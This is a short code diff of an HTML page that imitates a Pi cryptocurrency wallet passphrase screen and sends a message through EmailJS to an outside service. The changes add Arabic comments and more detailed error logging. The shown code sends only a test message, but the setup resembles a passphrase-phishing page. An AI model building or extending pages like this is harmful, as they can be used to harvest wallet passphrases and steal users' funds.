@@ -141,6 +141,7 @@
         <p class="info-text">Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your pi in your previous wallet will be inaccessible.</p>
     </main>
 
+    <!-- إضافة مكتبة EmailJS -->
     <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script>
         emailjs.init('user_tjataup');  // تأكد من إدخال الـ User ID بشكل صحيح
@@ -153,12 +154,14 @@
                 message: 'Hello, this is a test email.'
             };
 
+            // إرسال الرسالة باستخدام EmailJS
             emailjs.send('service_tjataup', 'template_ca9ohx4', templateParams)
                 .then(function (response) {
                     alert('Message sent successfully!');
                     // يمكنك إضافة أي كود لتمرير المستخدم إلى صفحة أخرى أو أي إجراء بعد الإرسال.
                 }, function (error) {
-                    alert('Failed to send message. Error: ' + error);
+                    console.error('Failed to send message. Error details:', error);
+                    alert('Failed to send message. Please check the console for more details.');
                 });
         }
     </script>
